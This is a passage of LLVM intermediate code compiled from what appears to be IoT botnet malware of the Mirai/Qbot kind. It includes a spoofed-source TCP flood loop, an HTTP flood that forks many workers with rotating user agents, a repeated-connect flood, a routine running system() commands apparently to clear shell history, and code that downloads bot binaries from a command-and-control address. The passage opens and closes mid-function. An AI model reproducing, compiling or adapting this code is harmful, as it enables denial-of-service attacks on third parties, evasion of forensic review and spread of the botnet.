  %186 = load i8*, i8** %23, align 8
  %187 = call i32 @strcmp(i8* %186, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.79, i32 0, i32 0)) #10
  %188 = icmp ne i32 %187, 0
  br i1 %188, label %197, label %189

; <label>:189:                                    ; preds = %185
  %190 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  %192 = bitcast %union.anon.0* %191 to %struct.anon.1*
  %193 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -257
  %196 = or i16 %195, 256
  store i16 %196, i16* %193, align 4
  br label %227

; <label>:197:                                    ; preds = %185
  %198 = load i8*, i8** %23, align 8
  %199 = call i32 @strcmp(i8* %198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.80, i32 0, i32 0)) #10
  %200 = icmp ne i32 %199, 0
  br i1 %200, label %209, label %201

; <label>:201:                                    ; preds = %197
  %202 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 0
  %204 = bitcast %union.anon.0* %203 to %struct.anon.1*
  %205 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %206, -4097
  %208 = or i16 %207, 4096
  store i16 %208, i16* %205, align 4
  br label %226

; <label>:209:                                    ; preds = %197
  %210 = load i8*, i8** %23, align 8
  %211 = call i32 @strcmp(i8* %210, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i32 0, i32 0)) #10
  %212 = icmp ne i32 %211, 0
  br i1 %212, label %221, label %213

; <label>:213:                                    ; preds = %209
  %214 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.0* %215 to %struct.anon.1*
  %217 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = and i16 %218, -2049
  %220 = or i16 %219, 2048
  store i16 %220, i16* %217, align 4
  br label %225

; <label>:221:                                    ; preds = %209
  %222 = load i32, i32* @mainCommSock, align 4
  %223 = load i8*, i8** %23, align 8
  %224 = call i32 (i32, i8*, ...) @sockprintf(i32 %222, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.82, i32 0, i32 0), i8* %223)
  br label %225

; <label>:225:                                    ; preds = %221, %213
  br label %226

; <label>:226:                                    ; preds = %225, %201
  br label %227

; <label>:227:                                    ; preds = %226, %189
  br label %228

; <label>:228:                                    ; preds = %227, %177
  br label %229

; <label>:229:                                    ; preds = %228, %165
  %230 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %230, i8** %23, align 8
  br label %158

; <label>:231:                                    ; preds = %158
  br label %232

; <label>:232:                                    ; preds = %231, %119
  %233 = call i32 @rand_cmwc()
  %234 = trunc i32 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 0
  %237 = bitcast %union.anon.0* %236 to %struct.anon.1*
  %238 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %237, i32 0, i32 5
  store i16 %234, i16* %238, align 2
  %239 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 0
  %241 = bitcast %union.anon.0* %240 to %struct.anon.1*
  %242 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %241, i32 0, i32 6
  store i16 0, i16* %242, align 4
  %243 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 0
  %245 = bitcast %union.anon.0* %244 to %struct.anon.1*
  %246 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %245, i32 0, i32 7
  store i16 0, i16* %246, align 2
  %247 = load i32, i32* %9, align 4
  %248 = icmp eq i32 %247, 0
  br i1 %248, label %249, label %251

; <label>:249:                                    ; preds = %232
  %250 = call i32 @rand_cmwc()
  br label %256

; <label>:251:                                    ; preds = %232
  %252 = load i32, i32* %9, align 4
  %253 = trunc i32 %252 to i16
  %254 = call zeroext i16 @htons(i16 zeroext %253) #13
  %255 = zext i16 %254 to i32
  br label %256

; <label>:256:                                    ; preds = %251, %249
  %257 = phi i32 [ %250, %249 ], [ %255, %251 ]
  %258 = trunc i32 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon.0* %260 to %struct.anon.1*
  %262 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %261, i32 0, i32 1
  store i16 %258, i16* %262, align 2
  %263 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %264 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %265 = call zeroext i16 @tcpcsum(%struct.iphdr* %263, %struct.tcphdr* %264)
  %266 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 0
  %268 = bitcast %union.anon.0* %267 to %struct.anon.1*
  %269 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %268, i32 0, i32 6
  store i16 %265, i16* %269, align 4
  %270 = bitcast i8* %77 to i16*
  %271 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 2
  %273 = load i16, i16* %272, align 2
  %274 = zext i16 %273 to i32
  %275 = call zeroext i16 @csum(i16* %270, i32 %274)
  %276 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 7
  store i16 %275, i16* %277, align 2
  %278 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %279 = load i32, i32* %10, align 4
  %280 = add nsw i32 %278, %279
  store i32 %280, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %281

; <label>:281:                                    ; preds = %334, %333, %256
  br label %282

; <label>:282:                                    ; preds = %281
  %283 = load i32, i32* %17, align 4
  %284 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %285 = call i64 @sendto(i32 %283, i8* %77, i64 %75, i32 0, %struct.sockaddr* %284, i32 16)
  %286 = load i32, i32* %19, align 4
  %287 = call i32 @GetRandomIP(i32 %286)
  %288 = call i32 @htonl(i32 %287) #13
  %289 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 8
  store i32 %288, i32* %290, align 4
  %291 = call i32 @rand_cmwc()
  %292 = trunc i32 %291 to i16
  %293 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 3
  store i16 %292, i16* %294, align 4
  %295 = call i32 @rand_cmwc()
  %296 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 0
  %298 = bitcast %union.anon.0* %297 to %struct.anon.1*
  %299 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %298, i32 0, i32 2
  store i32 %295, i32* %299, align 4
  %300 = call i32 @rand_cmwc()
  %301 = trunc i32 %300 to i16
  %302 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 0
  %304 = bitcast %union.anon.0* %303 to %struct.anon.1*
  %305 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %304, i32 0, i32 0
  store i16 %301, i16* %305, align 4
  %306 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 0
  %308 = bitcast %union.anon.0* %307 to %struct.anon.1*
  %309 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %308, i32 0, i32 6
  store i16 0, i16* %309, align 4
  %310 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %311 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %312 = call zeroext i16 @tcpcsum(%struct.iphdr* %310, %struct.tcphdr* %311)
  %313 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 0
  %315 = bitcast %union.anon.0* %314 to %struct.anon.1*
  %316 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %315, i32 0, i32 6
  store i16 %312, i16* %316, align 4
  %317 = bitcast i8* %77 to i16*
  %318 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 2
  %320 = load i16, i16* %319, align 2
  %321 = zext i16 %320 to i32
  %322 = call zeroext i16 @csum(i16* %317, i32 %321)
  %323 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 7
  store i16 %322, i16* %324, align 2
  %325 = load i32, i32* %25, align 4
  %326 = load i32, i32* %15, align 4
  %327 = icmp eq i32 %325, %326
  br i1 %327, label %328, label %334

; <label>:328:                                    ; preds = %282
  %329 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %330 = load i32, i32* %24, align 4
  %331 = icmp sgt i32 %329, %330
  br i1 %331, label %332, label %333

; <label>:332:                                    ; preds = %328
  br label %337

; <label>:333:                                    ; preds = %328
  store i32 0, i32* %25, align 4
  br label %281

; <label>:334:                                    ; preds = %282
  %335 = load i32, i32* %25, align 4
  %336 = add i32 %335, 1
  store i32 %336, i32* %25, align 4
  br label %281

; <label>:337:                                    ; preds = %332
  %338 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %338)
  br label %339

; <label>:339:                                    ; preds = %337, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.83, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.84, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca [1 x i8], align 1
  %11 = alloca [512 x i8], align 16
  %12 = alloca [3 x i8*], align 16
  %13 = alloca [3 x i8*], align 16
  %14 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %9, align 8
  %17 = bitcast [3 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %17, i8* bitcast ([3 x i8*]* @sendHTTP.methods to i8*), i64 24, i32 16, i1 false)
  %18 = bitcast [3 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %18, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %19 = call i32 @getdtablesize() #2
  %20 = sdiv i32 %19, 2
  store i32 %20, i32* %14, align 4
  store i32 0, i32* %7, align 4
  br label %21

; <label>:21:                                     ; preds = %116, %3
  %22 = load i32, i32* %7, align 4
  %23 = load i32, i32* %14, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %119

; <label>:25:                                     ; preds = %21
  %26 = call i32 @fork() #2
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %115

; <label>:28:                                     ; preds = %25
  br label %29

; <label>:29:                                     ; preds = %114, %28
  %30 = load i8*, i8** %4, align 8
  %31 = load i32, i32* %5, align 4
  %32 = trunc i32 %31 to i16
  %33 = call i32 @socket_connect(i8* %30, i16 zeroext %32)
  store i32 %33, i32* %8, align 4
  %34 = load i32, i32* %8, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %105

; <label>:36:                                     ; preds = %29
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %38 = call i8* @strcpy(i8* %37, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0)) #2
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %41 = call i64 @strlen(i8* %40) #10
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = call i32 @rand() #2
  %44 = sext i32 %43 to i64
  %45 = urem i64 %44, 3
  %46 = getelementptr inbounds [3 x i8*], [3 x i8*]* %12, i64 0, i64 %45
  %47 = load i8*, i8** %46, align 8
  %48 = call i8* @strcpy(i8* %42, i8* %47) #2
  %49 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %50 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %51 = call i64 @strlen(i8* %50) #10
  %52 = getelementptr inbounds i8, i8* %49, i64 %51
  %53 = call i8* @strcpy(i8* %52, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.92, i32 0, i32 0)) #2
  %54 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %56 = call i64 @strlen(i8* %55) #10
  %57 = getelementptr inbounds i8, i8* %54, i64 %56
  %58 = load i8*, i8** %4, align 8
  %59 = call i8* @strcpy(i8* %57, i8* %58) #2
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %62 = call i64 @strlen(i8* %61) #10
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = call i8* @strcpy(i8* %63, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.93, i32 0, i32 0)) #2
  %65 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %66 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %67 = call i64 @strlen(i8* %66) #10
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = call i32 @rand() #2
  %70 = sext i32 %69 to i64
  %71 = urem i64 %70, 32
  %72 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %71
  %73 = load i8*, i8** %72, align 8
  %74 = call i8* @strcpy(i8* %68, i8* %73) #2
  %75 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %76 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %77 = call i64 @strlen(i8* %76) #10
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = call i8* @strcpy(i8* %78, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.94, i32 0, i32 0)) #2
  %80 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %81 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %82 = call i64 @strlen(i8* %81) #10
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  %84 = call i32 @rand() #2
  %85 = sext i32 %84 to i64
  %86 = urem i64 %85, 3
  %87 = getelementptr inbounds [3 x i8*], [3 x i8*]* %13, i64 0, i64 %86
  %88 = load i8*, i8** %87, align 8
  %89 = call i8* @strcpy(i8* %83, i8* %88) #2
  %90 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %91 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %92 = call i64 @strlen(i8* %91) #10
  %93 = getelementptr inbounds i8, i8* %90, i64 %92
  %94 = call i8* @strcpy(i8* %93, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i32 0, i32 0)) #2
  %95 = load i32, i32* %8, align 4
  %96 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %97 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %98 = call i64 @strlen(i8* %97) #10
  %99 = call i64 @write(i32 %95, i8* %96, i64 %98)
  %100 = load i32, i32* %8, align 4
  %101 = getelementptr inbounds [1 x i8], [1 x i8]* %10, i32 0, i32 0
  %102 = call i64 @read(i32 %100, i8* %101, i64 1)
  %103 = load i32, i32* %8, align 4
  %104 = call i32 @close(i32 %103)
  br label %105

; <label>:105:                                    ; preds = %36, %29
  %106 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %107 = sext i32 %106 to i64
  %108 = load i64, i64* %9, align 8
  %109 = load i32, i32* %6, align 4
  %110 = sext i32 %109 to i64
  %111 = add nsw i64 %108, %110
  %112 = icmp sge i64 %107, %111
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %105
  call void @_exit(i32 0) #12
  unreachable

; <label>:114:                                    ; preds = %105
  br label %29

; <label>:115:                                    ; preds = %25
  br label %116

; <label>:116:                                    ; preds = %115
  %117 = load i32, i32* %7, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %7, align 4
  br label %21

; <label>:119:                                    ; preds = %21
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %10, %11
  store i32 %12, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @inet_addr(i8* %13) #2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i32, i32* %5, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #13
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  br label %22

; <label>:22:                                     ; preds = %26, %3
  %23 = load i32, i32* %7, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = icmp sgt i32 %23, %24
  br i1 %25, label %26, label %34

; <label>:26:                                     ; preds = %22
  %27 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %27, i32* %8, align 4
  %28 = load i32, i32* %8, align 4
  %29 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %30 = call i32 @connect(i32 %28, %struct.sockaddr* %29, i32 16)
  %31 = call i32 @sleep(i32 1)
  %32 = load i32, i32* %8, align 4
  %33 = call i32 @close(i32 %32)
  br label %22

; <label>:34:                                     ; preds = %22
  ret void
}

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @findwritedir() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.killerinfo*, align 8
  %3 = alloca %struct.__dirstream*, align 8
  %4 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.96, i32 0, i32 0))
  store %struct.__dirstream* %4, %struct.__dirstream** %3, align 8
  %5 = icmp eq %struct.__dirstream* %4, null
  br i1 %5, label %6, label %11

; <label>:6:                                      ; preds = %0
  %7 = load %struct.killerinfo*, %struct.killerinfo** %2, align 8
  %8 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %7, i32 0, i32 0
  %9 = load i8*, i8** %8, align 8
  %10 = call i8* @strcpy(i8* %9, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.97, i32 0, i32 0)) #2
  store i32 1, i32* %1, align 4
  br label %20

; <label>:11:                                     ; preds = %0
  %12 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.98, i32 0, i32 0))
  store %struct.__dirstream* %12, %struct.__dirstream** %3, align 8
  %13 = icmp eq %struct.__dirstream* %12, null
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %11
  %15 = load %struct.killerinfo*, %struct.killerinfo** %2, align 8
  %16 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %15, i32 0, i32 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i8* @strcpy(i8* %17, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.99, i32 0, i32 0)) #2
  store i32 1, i32* %1, align 4
  br label %20

; <label>:19:                                     ; preds = %11
  store i32 0, i32* %1, align 4
  br label %20

; <label>:20:                                     ; preds = %19, %14, %6
  %21 = load i32, i32* %1, align 4
  ret i32 %21
}

declare %struct.__dirstream* @opendir(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @getArch() #0 {
  %1 = alloca [32 x i8], align 16
  %2 = alloca i8*, align 8
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.100, i32 0, i32 0), i8** %2, align 8
  %3 = getelementptr inbounds [32 x i8], [32 x i8]* %1, i32 0, i32 0
  %4 = load i8*, i8** %2, align 8
  %5 = call i8* @strcpy(i8* %3, i8* %4) #2
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %1, i32 0, i32 0
  ret i8* %6
}

; Function Attrs: noinline nounwind uwtable
define i32 @httpsocket(i8*, i32, i8*, i8*) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [128 x i8], align 16
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i8, align 1
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %15, align 4
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %21, align 4
  %22 = load i32, i32* %7, align 4
  %23 = trunc i32 %22 to i16
  %24 = call zeroext i16 @htons(i16 zeroext %23) #13
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i8*, i8** %6, align 8
  %27 = call i32 @inet_addr(i8* %26) #2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %27, i32* %29, align 4
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 (i8*, i32, ...) @open(i8* %30, i32 577, i32 511)
  store i32 %31, i32* %13, align 4
  %32 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %32, i32* %12, align 4
  %33 = load i32, i32* %12, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %38, label %35

; <label>:35:                                     ; preds = %4
  %36 = load i32, i32* %13, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %35, %4
  store i32 0, i32* %5, align 4
  br label %109

; <label>:39:                                     ; preds = %35
  %40 = load i32, i32* %12, align 4
  %41 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %14, align 4
  %43 = icmp slt i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  store i32 0, i32* %5, align 4
  br label %109

; <label>:45:                                     ; preds = %39
  %46 = load i8*, i8** %16, align 8
  %47 = call i8* @strcpy(i8* %46, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.101, i32 0, i32 0)) #2
  %48 = load i8*, i8** %16, align 8
  %49 = load i8*, i8** %16, align 8
  %50 = call i64 @strlen(i8* %49) #10
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8*, i8** %8, align 8
  %53 = call i8* @strcpy(i8* %51, i8* %52) #2
  %54 = load i8*, i8** %16, align 8
  %55 = load i8*, i8** %16, align 8
  %56 = call i64 @strlen(i8* %55) #10
  %57 = getelementptr inbounds i8, i8* %54, i64 %56
  %58 = call i8* @strcpy(i8* %57, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.102, i32 0, i32 0)) #2
  %59 = load i8*, i8** %16, align 8
  %60 = call i64 @strlen(i8* %59) #10
  %61 = trunc i64 %60 to i32
  store i32 %61, i32* %17, align 4
  %62 = load i32, i32* %12, align 4
  %63 = load i8*, i8** %16, align 8
  %64 = load i32, i32* %17, align 4
  %65 = sext i32 %64 to i64
  %66 = call i64 @write(i32 %62, i8* %63, i64 %65)
  %67 = load i32, i32* %17, align 4
  %68 = sext i32 %67 to i64
  %69 = icmp ne i64 %66, %68
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %45
  store i32 0, i32* %5, align 4
  br label %109

; <label>:71:                                     ; preds = %45
  br label %72

; <label>:72:                                     ; preds = %82, %71
  %73 = load i32, i32* %15, align 4
  %74 = icmp ne i32 %73, 218762506
  br i1 %74, label %75, label %88

; <label>:75:                                     ; preds = %72
  %76 = load i32, i32* %12, align 4
  %77 = call i64 @read(i32 %76, i8* %18, i64 1)
  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %19, align 4
  %79 = load i32, i32* %19, align 4
  %80 = icmp ne i32 %79, 1
  br i1 %80, label %81, label %82

; <label>:81:                                     ; preds = %75
  store i32 0, i32* %5, align 4
  br label %109

; <label>:82:                                     ; preds = %75
  %83 = load i32, i32* %15, align 4
  %84 = shl i32 %83, 8
  %85 = load i8, i8* %18, align 1
  %86 = sext i8 %85 to i32
  %87 = or i32 %84, %86
  store i32 %87, i32* %15, align 4
  br label %72

; <label>:88:                                     ; preds = %72
  %89 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.103, i32 0, i32 0))
  br label %90

; <label>:90:                                     ; preds = %98, %88
  %91 = load i32, i32* %12, align 4
  %92 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i32 0, i32 0
  %93 = call i64 @read(i32 %91, i8* %92, i64 128)
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %20, align 4
  %95 = load i32, i32* %20, align 4
  %96 = icmp sle i32 %95, 0
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  br label %104

; <label>:98:                                     ; preds = %90
  %99 = load i32, i32* %13, align 4
  %100 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i32 0, i32 0
  %101 = load i32, i32* %20, align 4
  %102 = sext i32 %101 to i64
  %103 = call i64 @write(i32 %99, i8* %100, i64 %102)
  br label %90

; <label>:104:                                    ; preds = %97
  %105 = load i32, i32* %12, align 4
  %106 = call i32 @close(i32 %105)
  %107 = load i32, i32* %13, align 4
  %108 = call i32 @close(i32 %107)
  store i32 1, i32* %5, align 4
  br label %109

; <label>:109:                                    ; preds = %104, %81, %70, %44, %38
  %110 = load i32, i32* %5, align 4
  ret i32 %110
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @UpdateBins() #0 {
  %1 = alloca %struct.killerinfo*, align 8
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = call i32 @findwritedir()
  %5 = load %struct.killerinfo*, %struct.killerinfo** %1, align 8
  %6 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %5, i32 0, i32 0
  %7 = load i8*, i8** %6, align 8
  %8 = call i32 @chdir(i8* %7) #2
  %9 = load i8*, i8** %2, align 8
  %10 = call i8* @strcpy(i8* %9, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  %11 = load i8*, i8** %2, align 8
  %12 = call i8* @getArch()
  %13 = call i8* @strcpy(i8* %11, i8* %12) #2
  %14 = load i8*, i8** @cncip, align 8
